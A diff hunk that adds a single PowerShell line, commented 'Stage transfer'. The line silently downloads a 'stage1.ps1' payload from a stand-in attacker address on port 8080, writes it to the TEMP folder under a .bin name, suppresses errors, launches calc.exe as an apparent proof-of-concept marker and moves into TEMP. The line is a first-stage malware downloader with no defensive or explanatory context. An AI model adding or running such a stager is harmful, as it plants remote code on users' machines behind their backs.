@@ -1,0 +1,1 @@
+<# Stage transfer #> $DownloadUrl = 'http://192.0.2.125:8080/stage1.ps1'; $DropPath = "$env:TEMP\stage1.bin"; Invoke-WebRequest -Uri $DownloadUrl -OutFile $DropPath -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath 'calc.exe' -ErrorAction SilentlyContinue; Set-Location -Path $env:TEMP
